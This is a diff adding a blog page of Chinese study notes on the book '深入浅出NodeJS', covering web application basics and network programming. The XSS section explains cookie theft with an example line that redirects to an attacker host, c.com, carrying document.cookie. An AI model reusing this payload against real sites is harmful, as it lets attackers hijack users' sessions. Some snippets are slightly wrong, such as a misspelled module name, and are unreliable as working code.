@@ -334,6 +334,1706 @@
   
   
   <div class="post-date">
+			<div class="post-month">06月</div>
+			<div class="post-day">20</div>
+	</div>
+  
+
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/20/6-nodejs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/kekelovely.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="KeKeHome">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/06/20/6-nodejs/" itemprop="url">「深入浅出NodeJS」 6. 构建Web应用</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-06-20T00:00:00+08:00">
+                2018-06-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="构建Web应用"><a href="#构建Web应用" class="headerlink" title="构建Web应用"></a>构建Web应用</h2><h3 id="基础功能"><a href="#基础功能" class="headerlink" title="基础功能"></a>基础功能</h3><h4 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h4><ol>
+<li>Web应用中，最常见的请求方法是GET和POST，除此之外，还有HEAD、DELETE、PUT、CONNECT等方法。请求方法存在于报文的第一行的第一个单词，通常是大写，如：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; GET /path?foo=bar HTTP/1.1</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="路径解析"><a href="#路径解析" class="headerlink" title="路径解析"></a>路径解析</h4><ol>
+<li>HTTP_Parser将路径（即报文第一行的第二部分）解析为req.url</li>
+</ol>
+<h4 id="查询字符串"><a href="#查询字符串" class="headerlink" title="查询字符串"></a>查询字符串</h4><ol>
+<li><p>在地址栏中路径后的?foo=bar&amp;baz=val字符串就是查询字符串，Node提供了querystring模块用于处理这部分数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var querystring = require(&apos;querystring&apos;);</span><br><span class="line">var query = querystring.parse(url.parse(req.url).query);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>更简洁的方法是给url.parse()传递第二个参数，它会将foo=bar&amp;baz=val解析为一个JSON对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var query = url.parse(req.url,true).query;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果查询字符串中的键出现多次，那么它的值会是一个数组，注意判断其类型</p>
+</li>
+</ol>
+<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><ol>
+<li>初识Cookie：Cookie的处理分为如下几步：</li>
+</ol>
+<ul>
+<li>服务器向客户端发送Cookie</li>
+<li>浏览器将Cookie保存</li>
+<li>之后每次浏览器都会将Cookie发向服务器端</li>
+</ul>
+<ol start="2">
+<li>Cookie值的格式是key=value; key2=value2形式的，可以用req.headers.cookie来访问cookie</li>
+<li><p>Cookie的标准格式，其中name=value是必须包含的部分，其余为可选参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// Expires和Max-Age是用来告知浏览器这个Cookie何时过期的</span><br><span class="line">Set-Cookie : name=value;Path=/;Expires=Sun,23-Apr-23 09:01:35 GMT;Domain =.domain.com;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>修改访问逻辑，通过Cookie判断用户的状态：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var handle = function(req,res)&#123;</span><br><span class="line">    if (!req.cookies.isVisit)&#123;</span><br><span class="line">        res.setHeader(&apos;Set-Cookie&apos;,serialize(&apos;isVisit&apos;,&apos;1&apos;));</span><br><span class="line">        res.writeHead(200);</span><br><span class="line">        res.end(&apos;欢迎第一次来到动物园&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        res.writeHead(200);</span><br><span class="line">        res.end(&apos;动物园再次欢迎你&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Cookie的性能影响</p>
+</li>
+</ol>
+<ul>
+<li>减小Cookie的大小</li>
+<li>为静态组件使用不同的域名</li>
+<li>减少DNS查询</li>
+</ul>
+<h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><ol>
+<li>为了解决Cookie敏感数据的问题，Session应运而生，Session的数据只保留在服务器端，客户端无法修改，这样数据的安全性得到一定的保障，数据也无需在协议中每次都被传递</li>
+</ol>
+<ul>
+<li><p>第一种：基于Cookie来实现用户和数据的映射</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res.session.isVisit = true;</span><br><span class="line">res.writeHead(200);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>第二种：通过查询字符串来实现浏览器端和服务器端数据的对应：用户访问时，如果服务器端发现查询字符串中不带session_id参数，就会将用户跳转到<a href="http://localhost/pathname?session_id" target="_blank" rel="noopener">http://localhost/pathname?session_id</a> = 1234567这样一个类似的地址，如果浏览器收到302状态码和Location报头，就会重新发起新的请求</p>
+</li>
+</ul>
+<ol start="2">
+<li>Session与内存：为了解决性能问题和Session数据无法跨进程共享的问题，常用方法是将Session集中化，统一转移到集中的数据存储中，常用的工具有Redis、Memcached</li>
+<li>Session与安全：尽管数据都放置在后端，但Session口令依然保存在客户端，这里就会存在口令被盗用的情况。</li>
+</ol>
+<ul>
+<li><p>XSS漏洞：XSS全称是跨站脚本攻击（Cross Site Scripting），XSS漏洞会让别的脚本执行，它的主要形成原因是用户的输入没有被转义，而是被直接执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 攻击者可能会构造一个含JavaScript代码的URL，未转义就执行</span><br><span class="line">http://a.com/pathname#&lt;script src=&quot;http://b.com/c.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">// 为了不让受害者直接发现这段URL中的猫腻，它可能会通过URL压缩成一个短网址</span><br><span class="line">http://t.cn/fasdlfj</span><br><span class="line">// 或者再次压缩</span><br><span class="line">http://url.cn/fasdlfb</span><br><span class="line">// 然后将最终的短网址发送给某个登录的在线用户，这段hash中的脚本将会在这个用户的浏览器中执行，而这段脚本中的内容如下所示：</span><br><span class="line">location.href = &quot;http://c.com/?&quot; + document.cookie;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>上述代码将该用户的Cookie提交给了c.com站点，这个站点就是攻击者的服务器，他也就能拿到该用户的Session口令。然后他在这个客户端中用该口令伪造Cookie，从而实现伪装用户的身份。</p>
+</li>
+</ul>
+<h4 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h4><ol>
+<li>Expires和Cache-Control能够实现对目标文件的缓存请求</li>
+<li>缓存清除：根据每次发布时路径中的文件内容的版本号和hash值进行更新，从而清除缓存</li>
+</ol>
+<h4 id="Basic认证"><a href="#Basic认证" class="headerlink" title="Basic认证"></a>Basic认证</h4><ol>
+<li>Basic认证是当客户端与服务器端进行请求时，允许通过用户名和密码实现的一种身份认证方式。</li>
+<li><p>Basic认证中，会将username+”:”+password进行Base64编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var decoded = new Buffer(encoded,&apos;base64&apos;).toString(&apos;utf-8&apos;).split(&quot;:&quot;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>一般而言，未认证的情况下，浏览器会弹出对话框进行交互式提交认证信息</p>
+</li>
+</ol>
+<h3 id="数据上传"><a href="#数据上传" class="headerlink" title="数据上传"></a>数据上传</h3><ol>
+<li><p>报文的内容部分需要用户自行接收和解析。通过报头的Transfer-Encoding或Content-Length即可判断请求中是否带有内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var hasBody = function(req)&#123;</span><br><span class="line">    return &apos;transfer-encoding&apos; in req.headers || &apos;content-length&apos; in req.headers;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在HTTP_Parser解析报头结束后，报文内容部分通过data事件触发，用流的方式处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">req.on(&apos;data&apos;,function(chunk)&#123;</span><br><span class="line">    buffers.push(chunk);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="表单数据"><a href="#表单数据" class="headerlink" title="表单数据"></a>表单数据</h4><ol>
+<li><p>默认的表单提交，请求头中的Content-Type字段值为application/x-www-form-urlencoded,解析方式如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var handle = function(req,res)&#123;</span><br><span class="line">    if (req.headers[&apos;content-type&apos;] === &apos;application/x-www-form-urlencoded&apos;)&#123;</span><br><span class="line">        req.body = querystring.parse(req.rawBody);</span><br><span class="line">    &#125; </span><br><span class="line">    todo(req,res);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>后续业务中直接访问req.body就可以得到表单中提交的数据</p>
+</li>
+</ol>
+<h4 id="其他格式"><a href="#其他格式" class="headerlink" title="其他格式"></a>其他格式</h4><ol>
+<li>都是根据Content-Type字段值决定，JSON类型的值为application/json,XML的值为application/xml</li>
+</ol>
+<h4 id="附件上传"><a href="#附件上传" class="headerlink" title="附件上传"></a>附件上传</h4><ol>
+<li>在前端HTML代码中，特殊表单与普通表单的差异在于该表单中可以含有file类型的控件，以及需要指定表单属性enctype为multipart/form-data，其Content-Type字段值为为multipart/form-data<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action = &quot;/upload&quot; method = &quot;post&quot; enctype = &quot;multipart/form-data&quot;&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="数据上传与安全"><a href="#数据上传与安全" class="headerlink" title="数据上传与安全"></a>数据上传与安全</h4><ol>
+<li>内存限制：防止提交请求的数据量过大</li>
+</ol>
+<ul>
+<li>限制上传内容的大小，一旦超过限制，停止接收数据，并响应400状态码</li>
+<li>通过流式解析，将数据流导向到磁盘中，Node只保留文件路径等小数据</li>
+</ul>
+<ol start="2">
+<li>CSRF:Cross-Site Request Forgery，跨站请求伪造，解决CSRF攻击的方案是为每个请求的用户，在Session中赋予一个随机值</li>
+</ol>
+<h3 id="路由解析"><a href="#路由解析" class="headerlink" title="路由解析"></a>路由解析</h3><h4 id="文件路径型"><a href="#文件路径型" class="headerlink" title="文件路径型"></a>文件路径型</h4><ol>
+<li>静态文件</li>
+<li>动态文件</li>
+</ol>
+<h4 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h4><ol>
+<li>MVC模型的主要思想是将业务逻辑按职责分离，主要分为如下几种：</li>
+</ol>
+<ul>
+<li>控制器Controller：一组行为的集合</li>
+<li>模型Model：数据相关的操作和封装</li>
+<li>视图View：视图的渲染</li>
+</ul>
+<ol start="2">
+<li>它的工作模式如下说明：</li>
+</ol>
+<ul>
+<li>路由解析，根据URL寻找到对应的控制器和行为</li>
+<li>行为调用相关的模型，进行数据操作</li>
+<li>数据操作结束后，调用视图和相关数据进行页面渲染，输出到客户端</li>
+</ul>
+<h4 id="手工映射"><a href="#手工映射" class="headerlink" title="手工映射"></a>手工映射</h4><h4 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h4><h4 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h4><h4 id="自然映射"><a href="#自然映射" class="headerlink" title="自然映射"></a>自然映射</h4><h4 id="RESTful"><a href="#RESTful" class="headerlink" title="RESTful"></a>RESTful</h4><ol>
+<li>全称是Representational State Transfer,中文含义为表现层状态转化，主要将服务器端提供的内容实体看作一个资源，并表现在URL上</li>
+</ol>
+<h3 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h3><ol>
+<li>我们通过中间件的形式搭建开发框架，这个开发框架用来组织各个中间件。对于Web应用的各种基础功能，我们通过中间件来完成，每个中间件处理掉相对简单的逻辑，最终汇成强大的基础框架。</li>
+<li><p>一个基本的中间件会是如下形式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var middleware = function(req,res,next)&#123;</span><br><span class="line">    // TODO</span><br><span class="line">    next();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>为具体的业务逻辑添加中间件，借助框架支持，将所有基础功能支持串联起来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.use(&apos;/user/:username&apos;,querystring,cookie,session,function(req,res)&#123;</span><br><span class="line">    // TODO</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>use()方法的改进</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.use = function(path)&#123;</span><br><span class="line">    var handle = &#123;</span><br><span class="line">    // 第一个参数作为路径</span><br><span class="line">    path:pathRegexp(path);</span><br><span class="line">    // 其他的都是处理单元</span><br><span class="line">    stack:Array.prototype.slice.call(arguments,1)</span><br><span class="line">    &#125;;</span><br><span class="line">    routes.all.push(handle);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h4><ol>
+<li>为next()方法添加err参数，捕获中间件直接抛出的同步异常<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">    middleware(req,res,next);</span><br><span class="line">&#125;catch(ex)&#123;</span><br><span class="line">    next(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="中间件与性能"><a href="#中间件与性能" class="headerlink" title="中间件与性能"></a>中间件与性能</h4><ol>
+<li>编写高效的中间件</li>
+</ol>
+<ul>
+<li>使用高效的方法，必要时通过jsperf.com测试基准性能</li>
+<li>缓存需要重复计算的结果（控制缓存用量）</li>
+<li>避免不必要的计算，比如HTTP报文体的解析，对于GET方法完全不需要</li>
+</ul>
+<ol start="2">
+<li>合理使用路由</li>
+</ol>
+<h3 id="页面渲染"><a href="#页面渲染" class="headerlink" title="页面渲染"></a>页面渲染</h3><h4 id="内容响应"><a href="#内容响应" class="headerlink" title="内容响应"></a>内容响应</h4><ol>
+<li>MIME</li>
+</ol>
+<ul>
+<li>全称是Multipurposes Internet Mail Extensions，不同的文件类型有不同的MIME值，如JSON文件的值为application/json、XML文件的值为application/xml、PDF文件的值为application/pdf</li>
+<li>浏览器对不同Content-Type字段值采用了不同的渲染处理方式，这个值我们称为MIME值</li>
+<li>为了方便获取文件的MIME值，社区有专有的mime模块<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var mime = require(&apos;mime&apos;);</span><br><span class="line">mime.lookup(&apos;path/to/file.txt&apos;) // =&gt; &apos;text/plain&apos;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ol start="2">
+<li>附件下载</li>
+</ol>
+<ul>
+<li>Content-Disposition字段，其值为inline时只需查看，值为attachment时数据可以存为附件</li>
+</ul>
+<ol start="3">
+<li><p>响应JSON</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">res.json = function(json)&#123;</span><br><span class="line">    res.setHeader(&apos;Content-Type&apos;,&apos;application/json&apos;);</span><br><span class="line">    res.writeHead(200);</span><br><span class="line">    res.end(JSON.stringify(json));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>响应跳转</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">res.redirect = function(url)&#123;</span><br><span class="line">    res.setHeader(&apos;Location&apos;,url);</span><br><span class="line">    res.writeHead(302);</span><br><span class="line">    res.end(&apos;Redirect to&apos; + url);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="视图渲染"><a href="#视图渲染" class="headerlink" title="视图渲染"></a>视图渲染</h4><ol>
+<li>渲染方法：render()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">res.render = function(view,data)&#123;</span><br><span class="line">    res.setHeader(&apos;Content-Type&apos;,&apos;text/html&apos;);</span><br><span class="line">    res.writeHead(200);</span><br><span class="line">    // 实际渲染</span><br><span class="line">    var html = render(view,data);</span><br><span class="line">    res.end(html);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/06/20/6-nodejs/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-date">
+			<div class="post-month">06月</div>
+			<div class="post-day">19</div>
+	</div>
+  
+
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/19/5-nodejs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/kekelovely.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="KeKeHome">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/06/19/5-nodejs/" itemprop="url">「深入浅出NodeJS」 5. 网络编程</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-06-19T00:00:00+08:00">
+                2018-06-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h2><h4 id="TCP服务的事件"><a href="#TCP服务的事件" class="headerlink" title="TCP服务的事件"></a>TCP服务的事件</h4><ol>
+<li>服务器事件</li>
+</ol>
+<ul>
+<li>listening: server.listen(port,listeningListner);</li>
+<li>connection: net.createServer();</li>
+<li>close</li>
+<li>error</li>
+</ul>
+<ol start="2">
+<li>连接事件</li>
+</ol>
+<ul>
+<li>服务器可以同时与多个客户端保持连接，对于每个连接而言是典型的可写可读Stream对象，既可以通过data事件从一端读取另一端发来的数据，也可以通过wirte()方法从一端向另一端发送数据</li>
+<li>data</li>
+<li>end</li>
+<li>connect</li>
+<li>drain：任意一端调用write()发送数据时，当前这端会触发该事件</li>
+<li>error</li>
+<li>close</li>
+<li>timeout：通知用户连接被闲置</li>
+</ul>
+<h3 id="构建UDP服务"><a href="#构建UDP服务" class="headerlink" title="构建UDP服务"></a>构建UDP服务</h3><ol>
+<li>UDP称用户数据包协议，与TCP一样同属于网络传输层。UDP中，一个套接字可以与多个UDP服务通信，提供面向事务的简单不可靠信息传输服务，DNS服务即是基于它实现的。</li>
+</ol>
+<h4 id="创建UDP套接字"><a href="#创建UDP套接字" class="headerlink" title="创建UDP套接字"></a>创建UDP套接字</h4><ol>
+<li>UDP套接字一旦创建，既可以作为客户端发送数据，也可以作为服务端接收数据。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var dgram = require(&apos;dgream&apos;);</span><br><span class="line">var socket = dgram.createSocket(&quot;udp4&quot;);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="创建UDP服务器端"><a href="#创建UDP服务器端" class="headerlink" title="创建UDP服务器端"></a>创建UDP服务器端</h4><ol>
+<li>让UDP套接字接收网络消息，只要调用dgram.bind(port,[address])方法对网卡和端口进行绑定<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var server = dgram.createSocket(&quot;udp4&quot;);</span><br><span class="line">/...</span><br><span class="line">server.bind(41234);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="创建UDP客户端"><a href="#创建UDP客户端" class="headerlink" title="创建UDP客户端"></a>创建UDP客户端</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var dgram = require(&apos;dgram&apos;);</span><br><span class="line">var message = new Buffer(&quot;深入浅出Node.js&quot;);</span><br><span class="line">/...</span><br><span class="line">var client = dgram.createSocket(&quot;udp4&quot;);</span><br></pre></td></tr></table></figure>
+<h4 id="UDP套接字事件"><a href="#UDP套接字事件" class="headerlink" title="UDP套接字事件"></a>UDP套接字事件</h4><ul>
+<li>message：触发携带的数据为消息Buffer对象和一个远程地址信息</li>
+<li>listening</li>
+<li>close</li>
+<li>error</li>
+</ul>
+<h3 id="构建HTTP服务"><a href="#构建HTTP服务" class="headerlink" title="构建HTTP服务"></a>构建HTTP服务</h3><h4 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h4><ol>
+<li>初识HTTP</li>
+<li>HTTP报文：</li>
+</ol>
+<ul>
+<li>HTTP服务只做两件事情，处理HTTP请求和发送HTTP响应</li>
+<li>报文内容包含两个部分：报文头和报文体</li>
+</ul>
+<h4 id="http模块"><a href="#http模块" class="headerlink" title="http模块"></a>http模块</h4><ol>
+<li>HTTP请求：对于TCP连接的读操作，http模块将其封装为ServerRequest对象，报文头部通过http_parser进行解析</li>
+<li>HTTP响应：</li>
+</ol>
+<ul>
+<li>报文头：res.setHeader()和res.writeHead()</li>
+<li>报文体：res.write()和res.end()</li>
+</ul>
+<ol start="3">
+<li>HTTP服务的事件：</li>
+</ol>
+<ul>
+<li>connection事件：</li>
+<li>request事件</li>
+<li>close事件</li>
+<li>checkContinue事件</li>
+<li>connect事件</li>
+<li>upgrade事件</li>
+<li>clienterror事件</li>
+</ul>
+<h4 id="HTTP客户端"><a href="#HTTP客户端" class="headerlink" title="HTTP客户端"></a>HTTP客户端</h4><ol>
+<li>HTTP响应</li>
+<li>HTTP代理</li>
+<li>HTTP客户端事件</li>
+</ol>
+<ul>
+<li>response</li>
+<li>socket</li>
+<li>connect</li>
+<li>upgrade</li>
+<li>continue</li>
+</ul>
+<h3 id="构建WebSocket服务"><a href="#构建WebSocket服务" class="headerlink" title="构建WebSocket服务"></a>构建WebSocket服务</h3><ol>
+<li><p>我们用一段代码来展示Websocket在客户端的应用示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var socket = new WebSocket(&apos;ws://127.0.0.1:12010/updates&apos;);</span><br><span class="line">    socket.onopen = function()&#123;</span><br><span class="line">        setInterval(function()&#123;</span><br><span class="line">            if (socket.bufferedAmount === 0)</span><br><span class="line">                socket.send(getUpdateData());</span><br><span class="line">        &#125;,50);</span><br><span class="line">    &#125;;</span><br><span class="line">    socket.onmessage = function(event)&#123;</span><br><span class="line">        //TODO:event.data</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用WebSocket，网页客户端只需一个TCP连接即可完成双向通信，无须频繁断开连接和重发请求，连接可以得到高校应用。</p>
+</li>
+<li>WebSocket协议主要分为两个部分：握手和数据传输</li>
+</ol>
+<h4 id="WebSocket握手"><a href="#WebSocket握手" class="headerlink" title="WebSocket握手"></a>WebSocket握手</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 这两个字段表示服务器端升级协议为WebSocket</span><br><span class="line">Upgrade：websocket</span><br><span class="line">Connection：Upgrade</span><br></pre></td></tr></table></figure>
+<ol>
+<li>Sec-WebSocket-Key用于安全校验</li>
+<li>一旦WebSocket握手成功，服务器端与客户端将会呈现对等的效果，都能接收和发送消息。</li>
+</ol>
+<h4 id="WebSocket数据传输"><a href="#WebSocket数据传输" class="headerlink" title="WebSocket数据传输"></a>WebSocket数据传输</h4><ol>
+<li>握手顺利完成后，当前连接不再进行HTTP交互，而是通过WebSocket的数据帧协议进行数据交换</li>
+<li>当我们调用send()发送一条数据时，协议可能将这个数据封装为一帧或多帧数据，然后逐帧发送</li>
+</ol>
+<h3 id="网络服务与安全"><a href="#网络服务与安全" class="headerlink" title="网络服务与安全"></a>网络服务与安全</h3><blockquote>
+<ul>
+<li>SSL:Secure Sockets Layer,安全套接层。SSL作为一种安全协议，它在传输层就提供对网络连接加密的功能，对于应用层而言，它是透明的。最初SSL应用在Web上，被服务器端和浏览器端同时支持，随后IETF将其标准化，称为TLS（Transport Layer Security，安全传输层协议）</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>Node在网络安全上提供了crypto,tls,https三个模块，crypto用于加密解密，用到了SHA1、MD5等加密算法，后两者都是建立安全的连接</li>
+</ul>
+</blockquote>
+<h4 id="TLS-SSL"><a href="#TLS-SSL" class="headerlink" title="TLS/SSL"></a>TLS/SSL</h4><ol>
+<li>密钥</li>
+</ol>
+<ul>
+<li>为了避免中间人攻击，（即伪装的服务器端），TLS/SSL引入了数字证书进行认证。与直接用公钥不同，数字证书中包含了服务器的名称、主机名、服务器的公钥、签名颁发机构的名称、来自签名颁发机构的签名。</li>
+<li>在建立连接前，会通过证书中的签名确认收到的公钥是来自目标服务器的，从而产生信任关系。</li>
+</ul>
+<ol start="2">
+<li>数字证书</li>
+</ol>
+<ul>
+<li>为了得到签名证书，服务器端需要通过自己的私钥生成CSR（Certificate Signing Request,证书签名请求）文件，CA机构（Certificate Authority，数字证书认证中心）将通过这个文件颁发属于该服务器端的签名证书，只要通过CA机构就能验证证书是否合法<h4 id="7-5-2-TLS服务"><a href="#7-5-2-TLS服务" class="headerlink" title="7.5.2 TLS服务"></a>7.5.2 TLS服务</h4></li>
+</ul>
+<ol>
